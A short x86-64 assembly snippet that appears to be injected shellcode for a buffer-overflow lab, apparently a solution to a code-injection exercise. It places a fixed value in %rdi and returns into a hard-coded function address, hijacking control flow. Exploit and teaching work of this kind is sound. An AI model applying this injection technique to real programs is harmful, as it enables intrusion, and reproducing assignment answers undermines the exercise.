.section .text
.global _start

_start:
    mov $0x59b997fa,%rdi
    xor %rax,%rax
    mov $0x4017ec,%rax
    push %rax
    ret
    